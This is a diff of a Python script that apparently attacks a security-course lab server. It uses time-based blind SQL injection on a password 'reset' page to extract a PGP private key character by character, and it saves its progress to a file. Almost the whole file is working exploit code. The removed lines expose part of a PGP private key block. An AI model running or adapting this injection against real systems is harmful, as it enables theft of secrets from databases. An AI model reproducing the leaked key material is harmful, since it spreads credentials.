@@ -1,5 +1,10 @@
 #!/bin/python
 
+import urllib as url
+import time
+import string
+import sys
+
 adress = "lbs-course.askarov.net"
 port = 3030
 page = "reset"
@@ -11,17 +16,7 @@ injectionEnd = ";--"
 
 maxDelay = 0.2
 
-keySoFar = """-----BEGIN PGP PRIVATE KEY BLOCK-----
-Version: GnuPG v1
-
-lQOYBFcDxHUBCAC6pKKopQL1d39769zBTcoAS/it4rjies8sEmqlw4Yl/CfWMLPr
-rzsL0wk/gdsWDDs42aK0pgpWbo/2YrbTHyf1uV0ucXO6jLy7xfwBQoenLWiApgYv
-1LecOc8GX+GK9dkRYt5iBctDnB/5tIPMbu6LCcfNECZlO6l8EiihZXB3SYMCTKwY
-uW6rx66ac8VAcs0AfYkQgQh8lFtv"""
-
-import urllib as url
-import time
-import thread
+keyChars = list(string.ascii_lowercase+string.ascii_uppercase+string.digits+"/+-\n =")
 
 def encode(key):
     injection = injectionStart + "'" +key+"'" + slowQuery + injectionEnd
@@ -42,41 +37,39 @@ def isCorrect(time):
     return time>maxDelay
 
 def findNextChar(currentKey,tries=0):
-    for i in range(127,0,-1):
-        if(i==ord('?') or i==ord('*')):
-            continue
-        #time.sleep(1)
-        duration = queryOnce(currentKey+str(chr(i))+"*")
+    for i in keyChars:
+        duration = queryOnce(currentKey+i+"*")
         if isCorrect(duration):
-            print(currentKey+chr(i))
-            return currentKey+chr(i)
+            print(currentKey+i)
+            return currentKey+i
     #something went wrong
     if isCorrect(queryOnce(currentKey)):
         print("Cant find next char in this key:\n"+currentKey+"\ntrying again\n")
         if(tries>10):
             print("Tried 10 times and failed, current key is:\n"+currentKey)
-            f = open('keySoFar.txt','w')
-            f.write(currentKey)
-            f.close()
+            writeToFile(currentKey)
+            sys.exit()
         else:
             return findNextChar(currentKey,tries=tries+1)
     else:
         print("Incorrect key accepted once:\n"+currentKey)
         if currentKey!='':
             return findNextChar(currentKey[:-1])
-    
+
+def writeToFile(key):
+    print('writing '+ str(len(key))+' characters to file')
+    f = open('keySoFar.txt','w')
+    f.write(key)
+    f.close()
 
 def main():
     f = open('keySoFar.txt','r')
     key = f.read()
     f.close()
-    for i in range(0,3508):
+    for i in range(0,3508-len(key)):
         key = findNextChar(key)
-        if i%10==0 and isCorrect(queryOnce(key)):
-            print('writing to file')
-            f = open('keySoFar.txt','w')
-            f.write(key)
-            f.close()
+        if i%10==0:
+            writeToFile(key)
     return
 
 if __name__ == "__main__":
